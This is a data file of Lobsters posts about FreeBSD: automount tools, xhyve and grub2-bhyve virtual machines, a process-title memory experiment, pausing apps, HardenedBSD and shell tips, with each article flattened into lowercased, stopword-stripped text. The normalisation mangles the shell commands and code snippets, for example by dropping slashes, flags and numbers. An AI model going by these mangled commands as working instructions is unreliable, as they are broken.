308,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 17 - Automount Removable Media,https://vermaden.wordpress.com/2018/10/11/freebsd-desktop-part-17-automount-removable-media/,freebsd desktop part automount removable medium,freebsd desktop global page devd dev devd ada da mmcsd medium http githubcomvermadenautomount sysutilsautomount pkg autofs automount dsbmd dsbmc autofs fuseloadyes bootloaderconf kldload fuse sysutilsautomount binsh sysutilsdsbmd autofs medium sysutilsautomount simplemtpfs xterm sysutilsdsbmd sysutilsdsbmccli sysutilsdsbmd sysutilsautomount sysutilsdsbmd sysutilsautomount sysutilsautomount automount pkg pkg devd pkg install automount sysutilsautomount varlogautomountlog tail varlogautomountlog sysutilsautomount usrlocaletcautomountconf cat usrlocaletcautomountconf binsh sysutilsdsbmd sysutilsdsbmd dsbmd dsbmc dsbmccli pkg pkg install dsbmccli dsbmc dsbmd dsbmd dsbmc dsbmccli dsbmdenableyes etcrcconf fusefsexfat fusefsgphotofs fusefsntfs fusefssimplemtpfs fusefshfsfuse fusefslkl xinitrc xsession dsbmc dsbmd etcsysctlconf usrlocaletcdsbmdconf dsbmd varlogdsbmdlog tail varlogdsbmdlog dsbmd mount grep opts usrlocaletcdsbmdconf sed g awk print sort u dsbmc dsbmc nomadbsd autofs autofsloadyes bootloaderconf autofsenableyes etcrcconf medium medium nosuid etcautomaster etcdevdconf sysutilsfusefssimplemtpfs mtp simplemtpfs allowother etcautomaster fuseloadyes bootloaderconf autofs grep r autofsenable etc etcrcdautomountd onestop etcrcdautounmountd onestop etcrcdautomount onestop etcrcdautomountd onestart etcrcdautounmountd onestart etcrcdautomount onestart varlogmessages tail varlogmessages medium l l medium l cd mount grep medium l mount grep medium tail varlogmessages autofs umount medium history sysutilsamutils sysutilsautomounter amd update make autofs work autofs autofs trasz etcdevdconf update sysutilsautomount update sysutilsautomount randomwait delay sysutilsexfatutils sysutilsfusefsexfat sysutilsfusefsntfs sysutilsfusefssimplemtpfs sysutilsfusefshfsfuse sysutilsfusefslkl automount automountconf automountdevdconf automount devd fetch http rawgithubusercontentcomvermadenautomountmasterautomount fetch http rawgithubusercontentcomvermadenautomountmasterautomountconf fetch http rawgithubusercontentcomvermadenautomountmasterautomountdevdconf cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart update sysutilsautomount update sysutilsautomount cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart update major sysutilsautomount update rozhuk ivan sysutilsautomount cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart update minor sysutilsautomount update sysutilsautomount http bugsfreebsdorgbugzillashowbugcgi cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart update minor sysutilsautomount update http bugsfreebsdorgbugzillashowbugcgi cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart like,article freebsd desktop series introduce various method automatically mount externalremovable device usb esata diskspendrives sdmicrosd flash card may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content one freebsd daemon devd device state change daemon provides way userland program run certain kernel event happen event new block device appearsdisappears dev directory problem created devd based solution automount daemon workflow simple new adadammcsd device appears try detect filesystems partitionsslices mount remove device device disappears forcefully unmounts clean used mountpoint medium directory available github http githubcomvermadenautomount freebsd port sysutilsautomount port also install pkg package various solution appeared meantime one included freebsd base system autofs automount subsystem one dsbmddsbmc medium mounting daemonautomounter freebsd optional graphical gtk frontend also freebsd base system solution called autofs able make work one also remember mount fuse based filesystem freebsd fuse kernel module need loaded enable loading fuse kernel module boot add fuseloadyes line bootloaderconf file load running system type kldload fuse command try compare feature strength weakness sysutilsautomount customize mount option filesystem type written posix binsh script easy modify open selected file manager device inserted provides varlogautomountlog log file support mtp device android phone example support xfs hf support btrfs added sysutilsdsbmd customize mount option filesystem type support mtp device android phone example provides graphical fronted gtk toolkit open selected file manager device inserted support btrfshfsxfs provides varlogdsbmdlog log file sometimes hang cpu usage autofs support mtp device android phone example available base system allow custom mount option per filesystem provide log file support btrfshfsxfs added mount done interaction medium dir removed device unmounted automatically day used mine sysutilsautomount exclusively removable device automount solution android phone used simplemtpfs command within xterm terminal tried sysutilsdsbmd along sysutilsdsbmccli gtk graphical sysutilsdsbmd frontend really liked sometimes fails cpu usage requires restarting happen sysutilsautomount work stick provide update later result longer period testing sysutilsdsbmd daemon sysutilsautomount first describe daemon used since sysutilsautomount solution installation setup easy add automount package using pkg nothing needed pkg restart devd adding new configuration file pkg install automount one nice feature sysutilsautomount varlogautomountlog log file detail mounted filesystems tail varlogautomountlog mount fat detach mount point removed detach mount point removed random wait second attach action attach mount exfat detach mount point removed sysutilsautomount come usrlocaletcautomountconf configuration file option box cat usrlocaletcautomountconf userumountyes atimeno removedirsyes fm caja browser nodesktop uservermaden besides supporting yet mtp device work also simple solution written posix binsh script easy modify one need sysutilsdsbmd second option sysutilsdsbmd solution check link detailed description automounting daemon install dsbmddsbmcdsbmccli trio use pkg pkg install dsbmccli dsbmc dsbmd configure dsbmddsbmcdsbmccli trio step needed add dsbmdenableyes etcrcconf file install additional filesystems support depending need fusefsexfat fusefsgphotofs fusefsntfs fusefssimplemtpfs mtp fusefshfsfuse fusefslkl add line xinitrc file xsession dsb automounter dsbmccli dsbmc see dsbmc icon system tray area default dsbmd mount storage device regular user need make sure etcsysctlconf file applied put exfat usb device automatically mounted msdosfs local nosuid mounted vermaden configuration file available usrlocaletcdsbmdconf location dsbmd also come varlogdsbmdlog log file tail varlogdsbmdlog dsbmd killing blocking process thu oct dsbmd sending sigterm thu oct dsbmd command usrlocalsbinmountexfat dsbmddevice dsbmdmntpt executed uid failed code error thu oct dsbmd device mounted mediagms uid thu oct dsbmd device unmounted mediagms uid thu oct dsbmd device mounted mediagms uid thu oct dsbmd device unmounted mediagms uid thu oct dsbmd client uid disconnected thu oct dsbmd client uid connected thu oct dsbmd device mounted mediagms uid thu oct dsbmd also configured many useful option like mount option filesystem type separately grep opts usrlocaletcdsbmdconf sed g awk print sort u exfatopts extopts msdosfsopts ntfsopts ufsopts main gtk dsbmc window look follows also disable automatic mounting mount device hand dsbmc tool unmount also solution used nomadbsd portable distribution sometimes fails cpu usage error message one autofs last one freebsd base system solution enable one step add autofsloadyes bootloaderconf file add autofsenableyes etcrcconf file uncomment medium medium nosuid line etcautomaster file etcdevdconf file need add uncomment following content notify match system geom match subsystem dev action usrsbinautomount c mtp support also install sysutilsfusefssimplemtpfs add mtp simplemtpfs allowother line etcautomaster file along fuseloadyes bootloaderconf file restarted autofs daemon grep r autofsenable etc etcrcdautomountd rcvar autofsenable etcrcdautounmountd rcvar autofsenable etcrcdautomount rcvar autofsenable etcdefaultsrcconf autofsenable run autofs daemon etcrcdautomountd onestop etcrcdautounmountd onestop etcrcdautomount onestop etcrcdautomountd onestart etcrcdautounmountd onestart etcrcdautomount onestart attaching usb drive varlogmessages file show following information tail varlogmessages nov kernel nov kernel nov kernel nov kernel scsi bulkonly quirk nov kernel attached nov kernel bus target lun nov kernel usb disk pmap removable direct access scsi device nov kernel serial number nov kernel transfer nov kernel byte sector nov kernel check content medium directory contain dir l l medium total drwxrxrx root wheel drivedirectory mounted yet try access dir example display content l try enter cd command get automatically mounted mount grep medium map medium medium autofs l nluug mount grep medium map medium medium autofs msdosfs asynchronous local noatime nosuid automounted removed usb drive directory remained mounted tail varlogmessages nov kernel disconnected nov kernel port addr disconnected nov kernel bus target lun nov kernel usb disk pmap sn detached nov kernel periph destroyed nov kernel detached nov kernel uhubreattachport giving port reset device vanished autofs subsystem unmounted automatically mount grep medium map medium medium autofs msdosfs asynchronous local noatime nosuid automounted course manual unmounting hand work umount expect automounting daemon suitable desktop usage need manually access created medium directory time make mount history historically also sysutilsamutils berkeley automounter suite utility sysutilsautomounter provides script dynamically configure amd daemon update make autofs work reworked autofs section make work thanks author autofs subsystem trasz showing source problem needed entry etcdevdconf file missing original post work advertised least mounting still able make unmount directory automatically usb drive removal update sysutilsautomount update recently implemented mtp support android phone example sysutilsautomount script also added hf xfs support various fix speed improvement done like removal unneeded randomwait function delay time reduction second new version yet available freebsd port package grab directly github page available manual installation hard first built port add package sysutilsexfatutils exfat support sysutilsfusefsexfat exfat support sysutilsfusefsntfs ntfs read write support support sysutilsfusefssimplemtpfs mtp support sysutilsfusefshfsfuse hf support sysutilsfusefslkl xfs support download automountautomountconfautomountdevdconf file github page put appropriate place make automount executable restart devd daemon fetch http rawgithubusercontentcomvermadenautomountmasterautomount fetch http rawgithubusercontentcomvermadenautomountmasterautomountconf fetch http rawgithubusercontentcomvermadenautomountmasterautomountdevdconf cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart plugin usb thumb drive fun also forgot one thing also requires port package mtp update sysutilsautomount update new version sysutilsautomount available following fix fix mbrmsdosfs partition unmount issue yet available freebsd port please use manual procedure download unpack file copy file appropriate place shown cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart update major sysutilsautomount update thanks rozhuk ivan reworked sysutilsautomount code new version ready available changelog pretty impressive time new option available automountconf config file filesystem detectionmounting reworked totally file dd fstyp backends notification possible libnitify library automatic detection display variable new automatic wait device appearance new detection device block device introduction cdrom support automatic detection file manager exoopen option removedirs deprecated handle large option fat freebsd version yet available freebsd port please use manual procedure download unpack file copy file appropriate place shown cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart update minor sysutilsautomount update major rewrite sysutilsautomount bring limitation problem come small needed update changelog quite small time fixed mount user option config file made mtp filesystem detection mount better add another check filesystem already mounted already made pr soon available freebsd port http bugsfreebsdorgbugzillashowbugcgi want get faster download unpack file copy file appropriate place shown cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart regard update minor sysutilsautomount update changelog release phase support port fix umask exfat filesystems fix mount option already committed freebsd port tree http bugsfreebsdorgbugzillashowbugcgi want get faster download unpack file copy file appropriate place shown cp automountconf usrlocaletcautomountconf cp automountdevdconf usrlocaletcdevdautomountdevdconf cp automount usrlocalsbinautomount chmod x usrlocalsbinautomount etcrcddevd restart regard eof like like loading related
309,Lobsters,freebsd,FreeBSD,"Running FreeBSD on OSX using xhyve, a port of bhyve",https://dan.langille.org/2018/10/02/running-freebsd-on-osx-using-xhyve-a-port-of-bhyve/,running freebsd osx using xhyve port bhyve,bhyve xhyve macports trouble xhyve homebrew installing xhyve background information creating virtual disk freebsd running xhyve tutorial install script running script running installed instance,bhyve hypervisorvirtual machine manager developed freebsd xhyve port bhyve o x built top hypervisorframework o x yosemite higher run entirely userspace dependency usually use macports ran trouble xhyve morning tried homebrew instead installing homebew often referred brew outside scope please refer documentation installing xhyve install xhyve dan brew install head xhyve cloning http cloning usersdanlibrarycacheshomebrewxhyve git checking branch master already master branch date originmaster make file built second dan background information create two script install script run xhyve install freebsd run script run installed instance freebsd freebsd installed filebased filesystem yes create file freebsd installed bhyve documentation referred virtual disk need obtain copy install medium freebsd grabbed creating virtual disk wanted drive installing copy freshports database within freebsd instance considered running postgresql natively osx would prefer keep everything within freebsd freebsd running xhyve tutorial showed create virtual disk based used command dan xhyve mkfile nv cuppyimg cuppyimg byte putting xhyve work xhyve choice suit whatever want choose install script create install script make easier typing everything one command xhyvecuppyinstallsh based upon found xhyve tutorial mentioned binsh uuid u deaddeaddeaddeaddeaddeaddeaddead userboot bootvolume img usersdanxhyvecuppyimg kernelenv mem smp c pcidev hostbridge lpc net virtionet imgcd ahcicd imghdd virtioblk img lpcdev l stdio acpi xhyve acpi mem smp pcidev lpcdev net imgcd imghdd uuid f fbsd userboot bootvolume kernelenv note positive description correct line sure need uuid line userboot point userbootso file supplied xhyve installation may vary line bootvolume indicates image boot case freebsd install image line img virtual disk install created using mkfile img used within imghdd parameter see line mem system ram line smp system two cpu line imgcd image presented cd line imghdd definition hard drive image virtual disk know imgcd userboot need specified running script run script immediately presented freebsd splash screen freebsd splash screen shortly thereafter get select console type pressed enter console type begin freebsd install process detail step outside scope post freebsd installer install script completes back command line install completed running installed instance create run script copied install script modified slightly cp xhyvecuppyinstallsh xhyvecuppysh commented imgcd parameter changed bootvolume dan xhyve cat xhyvecuppysh binsh uuid u deaddeaddeaddeaddeaddeaddeaddead img usersdanxhyvecuppyimg userboot bootvolume img kernelenv mem smp c pcidev hostbridge lpc net virtionet imgcd ahcicd imghdd virtioblk img lpcdev l stdio acpi xhyve acpi mem smp pcidev lpcdev net imgcd imghdd uuid f fbsd userboot bootvolume kernelenv see moved img bootvolume start newlyinstalled freebsd service ran command xhyvexhyvecuppysh splash screen start soon login prompt installed instance look like zpool detail insight parameter script please let know update post install jail get instance speed thank helped
310,Lobsters,freebsd,FreeBSD,Polish BSD User Group,https://oshogbo.vexillium.org/blog/55/,polish bsd user group,polish bsd user group youtube channel facebook fudo security scale engine bsdnow,couple day another meeting polish bsd user group already meeting mean group running almost half year next meeting special one guest warsaw university technology considering decided summarize accomplishment decided start polish bsd user group promote bsd operating system poland know group working poland inspired one bay area freebsd user group meeting chance attend short talk colleague fudo security decided give try organize first meeting started need figure thing started assumption group work first assumption want conference meeting focused presentation networking solving user problem yes assumed would nice people would come meeting bsdrelated problem somebody able help decided presentation longer minute show interesting partfeature one bsd operating system another thing needed figure group intended one one hand would like bring new user bsd community also would like expert decided two talk meeting first one people experience bsd talk would focused freebsd install community work second talk advanced user talk discus interesting feature without describing everything start example presentation zfs checkpoint part assumed advanced user know zfs wanted highlight one new feature beginning user maybe understand everything part problem presentation minute pleasure work company us freebsd daily basis company agreed sponsor meetups thanks need look venue meeting held fudo security office sponsor pizza also pleasure work people fascinated bsds immediately decided coorganizers meeting decided record presentation part attendee introduce networking recorded well presentation speaker nt want recorded also easy decision goal network would like people show meeting decided used marketing tool maybe people see video later intrigued join u next meeting first streamed directly facebook using scale engine infrastructure provides better quality also triy minimize effort organizing meetups fun another job use eventbrite registration form useful know many pizza need order use github page host website weekly minute call discus idea next meeting also use trello synchronize task past month presentation every meeting attendee surprising thing attendee travelling whole poland sometimes driving hour get warsaw meeting discussed topic like yubikeys introduction freebsd freebsd university zfs boot environment checkpoint openbsd daily arm freeipa zerotrust qubesos fifa world cup final put one internet admins toolkits one meeting english george nevillneill presenting dtrace see presentation bsdpl meeting recording meeting youtube channel interested bsd poland want person travelled meeting please join u next meeting october university technology see map time changed location new semester starting university would like introduce bsd world student would like help organize meeting please hesitate contact u also always looking speaker would like speak meeting also please contact u also join u group facebook hope experience help people organize bsd user group around world think one best way building local community thinking hesitate longer grab friend organize thinking going meeting go really good fun would also like thank speaker coorganizing bsdpl would like thank jarosław żurek kamil czekirda konrad witaszczyk krzysztof szczepański michał borysiak michał mróz michał turski paweł jakub dawidek mateusz piotrowski thank fudo security sponsoring scale engine providing u stream bsdnow supporting u
311,Lobsters,freebsd,FreeBSD,Process title and missing memory space,https://oshogbo.vexillium.org/blog/54/,process title missing memory space,,amazing happens kind research many time find interesting thing around one topic looking first published post changing process name describes accomplished different operating system main point research described install operating system using bhyve hypervisors today last topic somewhat related looking process title easy notice kernel needed read piece memory would happen memory region exist find way accomplish first read code case much simpler would need check function used read memory region check function safe way another method would free memory region see happens method sound little bit hackish let try previous post already know force freebsd kernel read process memory region need set sysctl kernprocargspid empty value next step would get sysctl contains address process name address kept kernpsstrings sysctl code two thing include systypesh include syssysctlh include stdioh include unistdh intmain void int oid intptrt addr sizet len force kernel read process memory oid ctlkern oid kernproc oid kernprocargs oid getpid sysctl oid len sizeof addr sysctlbyname kernpsstrings addr len null return let analyze binary gdb gdb b sysctlbynamebreakpoint gdb rstarting program usrhomeoshogbosrcstackbpaout breakpoint sysctlbyname kernpsstrings oidlen sizeof realoid sizeof int gdb returnmake sysctlbyname return n main sysctlbyname kernpsstrings addr len null gdb px addr set breakpoint sysctlbyname function next command run binary return command tell gdb continue return current case sysctlbyname end check value addr variable got address check region address let use info proc mapping command display mapped address space find address belongs region mapping one flag mean growing assume process stack freebsd also check kernusrstack sysctl return address process stack address rightgdb info proc mapping rw rx sysctl kernusrstackkernusrstack kernpsstrings readonly sysctl change address point could change kernel allow u instead let move stack new place let free old stack register use stack rsp stack pointer rbp base pointer register need change value new region returned mmap function code gcc g masmintel include sysmmanh include stdioh include stdlibh intmain void void addr addr mmap protwrite protread mapstack asm volatile mov rax mov rsp rax mov rbp rax addr exit use inline assembly function change rsp rbp prefer intel syntax example need compiled masmintel flag change syntax intel one worth noticing clang issue assembly code work fine gcc program simplify thing call exit syscall kill program gracefully alternatively could copy return pointer stack mmap function us mapstack flag create valid stack region let check code force kernel read process memory get title change stack free old stack include systypesh include syssysctlh include sysmmanh include stdioh include stdlibh include unistdh intmain void void addr int oid force kernel read process memory oid ctlkern oid kernproc oid kernprocargs oid getpid sysctl oid addr mmap protwrite protread mapstack asm volatile mov rax mov rsp rax mov rbp rax addr munmap exit let run gdb gdb b exitbreakpoint gdb rstarting program usrhomeoshogbosrcstackbpaoutbreakpoint exit threadautoinitdummydecl gdb info proc mappingsprocess address space start addr end addr size offset flag file rx cn usrhomeoshogbosrcstackbpaout rw r cn rx c rw c rw r r cn rx c rw c r c rw rw rw rx gdb info inferior num description executable process usrhomeoshogbosrcstackbpaoutagain set breakpoint time exit function program break see original stack freed notice hardcoded stack home work generically last gdb command return u pid process let see p return u p aux grep tx aout see kernel read process memory simply return name binary nothing crashed could get point simply reading kernel code checking function used read kernel memory happens later way funny way
312,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 16 - Configuration - Pause Any Application,https://vermaden.wordpress.com/2018/09/19/freebsd-desktop-part-16-configuration-pause-any-application/,freebsd desktop part configuration pause application,kill process management ghost shell part xterm xdotool today show freeze application single keyboard shortcut mouse gesture utilize way small simple script freebsd desktop global page pkg pkg install xprop xdotool zenity xbindkeys desktoppausesh path bin script fetch scriptsdesktoppausesh http rawgithubusercontentcomvermadenscriptsmasterdesktoppausesh chmod x scriptsdesktoppausesh echo path grep script desktoppausesh desktoppausesh p l xbindkeys xbindkeysrc xbindkeys help key xbindkeys key xbindkeys key xbindkeysrc cat xbindkeysrc xbindkeys xbindkeys xbindkeys p ax grep firefox grep v grep p ax grep firefox grep v grep p ax grep firefox grep v grep desktoppausesh p p ax grep firefox grep v grep desktoppausesh p p ax grep firefox grep v grep xterm xbindkeys xinitrc xsession update update browsersuspender update seschwar stoppable layout xmonad update imglorp desktoppausesh pauseresume active window minimize pauseresume interactively selected window minimize http like,many desktop oriented operating system try provide various usability improvement feature like quite useful expose dashboard mac o x useless tile concept recent edition microsoft window system using unix many year knew could freeze pause process system kill sigstop signal unfreeze kill sigcont signal described process management section ghost shell part article way desktop application pita say least imagine opening xterm terminal searching chromium firefox process freezing one one every time need neither fortunately introduction called helper utility like xdotool possible implement usable manner today show freeze application single keyboard shortcut mouse gesture utilize way small simple script feature useful let say firefox started many tab open know drain battery life laptop close need information tab start firefox even battery usage load needed tab battery alternative pause firefox process use freeze process subprocesses use cpu battery power need unpause without need load tab example may heavy processing example started rawtherapee darktable processing large amount photo able smoothly watch video pause watch video unpause finish work also usable single player gaming really pause game literally may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content first need install called helper pkg command pkg install xprop xdotool zenity xbindkeys script would make magic happen desktoppausesh script available github syntax nicely colored save place searchable path variable like bin script directory make executable fetch scriptsdesktoppausesh http rawgithubusercontentcomvermadenscriptsmasterdesktoppausesh chmod x scriptsdesktoppausesh echo path grep script sbin bin usrsbin usrbin usrlocalsbin usrlocalbin homevermadenscripts three way usage desktoppausesh usage desktoppausesh option argument option pauseresume active window pauseresume interactively selected window p pauseresume specified pid l list paused processeswindows l list paused processeswindows pid argument pid p option started option would pauseunpause currently active window option best used keyboard shortcut mouse gesture start desktoppausesh script argument cursor change able select window freeze unfreeze p option usable terminal directly may want freezeunfreeze process without environment debugging purpose example last l option list application currently paused presentday generation laptop island type limited keyboard choose keyboard shortcut use still use thinkpad laptop keyboard little option pause break key seems best candidate feature use active window freezeunfreeze option shift pause break key interactive option create new keyboard shortcut use handy xbindkeys tool let see code put xbindkeysrc configuration file xbindkeys help xbindkeys philippe brochard usage xbindkeys option option v version print version exit default print default rc file f file use alternative rc file p pollrc poll rcguile configs update h help help x display set x display use v verbose information xbindkeys run show show actual keybinding k key identify one key pressed mk multikey identify multi key pressed g geometry size position window open kmk option n nodaemon nt start daemon single key need key option let xbindkeys key press combination key orand click window use one two line nocommand homexbindkeysrc bind key scheme function pause let read shift pause break sequence xbindkeys key press combination key orand click window use one two line nocommand homexbindkeysrc bind key scheme function shift pause needed information xbindkeysrc configuration file look configured cat xbindkeysrc pause break active window scriptsdesktoppausesh pause shift pause break interactive window scriptsdesktoppausesh shift pause let start xbindkeys verify work xbindkeys press pause break key terminal started xbindkeys utility hit enter several time terminal freezed hit pause break key etnered enter key passed unfreezed let check firefox example process run like usual r state like shown p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab freeze firefox pause break key process state p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab unfreeze pause break key get back normal r state p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab may course specify hand firefox pid current state desktoppausesh p info kill info kill info kill firefox browser paused p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab use unpause desktoppausesh p info kill info kill info kill viola firefox run p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab downside feature one remember paused application refresh process freezed see frozen epiphany browser upon xterm window moved pretty window like effect unpause epiphany get back normal shown remember add xbindkeys command xinitrc xsession file make permanent update one hacker news user named explained lack window content refresh application freezed cite comment depends window manager application state really affected stop updating redrawing area another window move away window manager asks underlying application update area screen dead wm keep displaying last thing something else happens spot hand compositing window manager dedicate separate buffer application exclusive access kind window manager would ask application update anything would take image dedicated application buffer update screen since application buffer modified anything else would last state application would turn find way screen glitch update one reddit user pointed browsersuspender solution simply suspends browser focus using stopcont signal update lobster user seschwar pointed stoppable layout functionality xmonad automatically pause process window except active one also us sigcont sigstop signal update one hacker news user named imglorp suggested command could also iconifyminify app window really good idea added option also minimize window desktoppausesh usage desktoppausesh option argument option pauseresume active window pauseresume active window minimize pauseresume interactively selected window pauseresume interactively selected window minimize p pauseresume specified pid l list paused processeswindows l list paused processeswindows pid argument pid p option changelog desktoppausesh script http eof like like loading related
313,Lobsters,freebsd,FreeBSD,Announcing The HardenedBSD Foundation,https://hardenedbsd.org/article/shawn-webb/2018-09-17/announcing-hardenedbsd-foundation,announcing hardenedbsd foundation,announced month,june announced intent become notforprofit taxexempt c organization united state took dedicated team month work behindthescenes make happen september hardenedbsd foundation corp granted c status point usbased person making donation deduct donation tax grateful contribute hardenedbsd whatever way thank making hardenedbsd possible look forward bright future driven helpful positive community
314,Lobsters,freebsd,FreeBSD,OpenBSD/NetBSD on FreeBSD using grub2-bhyve,https://oshogbo.vexillium.org/blog/53/,openbsdnetbsd freebsd using,process title,writing blog post process title needed couple virtual machine openbsd netbsd ubuntu day mainly used freebsd window bhyve spent time trying set openbsd using bhyve uefi described numerous problem trying use day discovered tool love allows load kernel using grub bootloader grub support operating system standard configuration exactly method used install netbsd ubuntu first let install freebsd box pkg install run need provide least name vm bhyve memsize specified default vm created memory grubbhyve test gnu grub version minimal bashlike line editing supported first word tab list possible command completion anywhere else tab list possible device file completionsgrub running grubbhyve command enter grub loader type l command see available device case one additional device called host always available allows host filesystem accessed list file devicegrub l host grub l host libexec bin usr bhyve compat tank etc boot net entropy proc lib root sys mnt rescue tmp home sbin medium jail copyright var devgrub exit console simply type reboot would like install new operating system zvol ztankbhyvepost another terminal create zfs create v ztankbhyvepost nt use zfs crazy reason also create raw blob using truncate command truncate postimg recommend installing operating system disk image installxxfs openbsd netbsd need create device map grubcat tmppostmap eof directorytodiskimage devzvolztankbhyveposteof mapping file describe name file grub case installation image zvolblob also try use iso image instead using device name use run grubbhyve command see two additional device grubbhyve tmppostmap postgrub l host example openbsd image contains multiple partition check itgrub l boot bsd etc partition contains kernel set root device load openbsd kernel boot grub set root grub kopenbsd h r bsdgrub boot run bhyve virtual machine case bhyve c w u h amdhostbridge ahcihd directorytodiskimage ahcihd devzvolztankbhyvepost lpc l stdio post unfortunately explaining whole bhyve command line beyond article installing operating system remove mapping file image bhyve command nt want type grub command simply redirect standard inputcat eof grubbhyve tmppostmap postset root kopenbsd h r bsdbooteof
315,Lobsters,freebsd,FreeBSD,Ghost in the Shell - Part 3,https://vermaden.wordpress.com/2018/09/15/ghost-in-the-shell-part-3/,ghost shell part,ghost shell global page query function l cd mv mkdir rm mc ranger vifm l grep query find grep query q l grep query q l grep query qq find grep query qq find grep query q something short query function q short query function q short query function qq short query function qq qq qq grep grep ghost shell part alias short query function q q qq qq qq qq cut history grep zhistory setopt histignorealldups wc l zhistory grep histsize usrlocaletczshrc grep dups usrlocaletczshrc h cat zhistory grep query h cat zhistory grep query alias grep useless use cat short history alias h h q h grep q query grep another h query grep another g g g grep g grep short grep function g g q query g another h query g another clear c short grep function c exa e short listing e exa l l gls l coreutils l l l l exa l somenotfilepdf l l exa space du sort g cd du sg sort n cd usr du sm sort n g h sort h du du smh sort h ncdu ncdu r b k j rightenter left h n c g c e r b q du du sm book du sma book file filescountsh du sort cd ncdu c c c filescountsh ncdu filescountsh cd usr filescountsh du ncdu filesbigsh var cd var filesbigsh tail doas sudo many copy keep dedupsh dedupsh cd miscman cp zfsnotes zfstodo dedupsh zfsnotes zfstodo dedupsh dedupsh filesbigsh doas sudo unusual interval crontab man crontab check environment crontab path envsh cron cat envsh envsh tmpenvout crontab crontab l grep env tmpenvout cat tmpenvout crontab simple http server python simplehttpserver httpserver python simplehttpserver port python httpserver port httpsh cd miscman httpsh simple ftp server pyftpdlib ftppy pyftpdlib anonymous writer writer ftppy cd miscman ftppy like,time bring life ghost shell series part article may want check article ghost shell series ghost shell global page find link episode series along table content episode content query function found better name solution generally two type unix people prefer navigate operate basic lscdmvmkdirrm command use file manager like midnight commander mc ranger vifm get idea tried various cli file manager always came back navigate without one people query function called query function filter information look example directory large number file would probably something like l grep query also want include subdirectory something like find grep query example would also probably want sometimes search case sensitive insensitive depending need lead u four query function q equivalent l grep query command q equivalent l grep query command qq equivalent find grep query command qq equivalent find grep query command thus need query content directory searching something fast q something definition query function short query function q q eq l grep color devnull else echo usage q string fi short query function q q eq l grep color devnull else echo usage q string fi short query function qq qq eq find grep devnull cut c grep color devnull else echo usage qq string fi short query function qq qq eq find grep devnull cut c grep devnull else echo usage qq string fi qq qq function us grep two time make sure output colored assume use colored grep described ghost shell part article prefer use alias instead would look like short query function q q qq qq alias q l grep color alias q l grep color alias qq find grep alias qq find grep qq qq little limited function possible trim output exact need cut lot people use recursive history search also help usedtyped needed command long ago argument need would probably search command history command using grep limit result look keep enormous large list command keep history current setting zhistory zsh file take mb size also wanted sure two identical command would kept history hence setopt histignorealldups zsh option enabled wc l zhistory file currently line command grep histsize usrlocaletczshrc export export savehist histsize grep dups usrlocaletczshrc setopt histignorealldups back query function history h equivalent cat zhistory grep query command h equivalent cat zhistory grep query command fit alias time alias use grep useless use cat query function history short history alias h h alias h zhistory grep alias h zhistory grep would like filter output q family h family query function obvious response using grep like q query grep another h query grep another example make faster make g g shortcut g equivalent grep command g equivalent grep command short grep function g g alias ggrep alias ggrep q query g another h query g another example clear terminal output may use clear command prefer ctrl l shortcut find c alias fastest solution short grep function c alias cclear make solution complete would also add exa alias e short listing e alias eexa timestylelongiso groupdirectoriesfirst exa ask bsd l gnu l installed gls freebsd confuse add gnu l freebsd system use coreutils package well bsd l two major con able sort directory first selects width column based single longest file name bsd l used following alias alias lsls p g h gnu l two problem color output limited pattern like executable file executable file directory link device gnu l used following alias gls p g color timestylelongiso groupdirectoriesfirst quotingstyleliteral exa come handy con like freebsd l color lot type file exa timestylelongiso groupdirectoriesfirst still simple coloring based file extension magic number plain empty text file somenotfilepdf colored like pdf document even limited coloring help case bsd l gnu l file seem like plain text file exa obvious start plain file image document like pdf file example space unix linux system exists du command combined sort universal way searching space eater example root directory g flag display unit gigabyte cd du 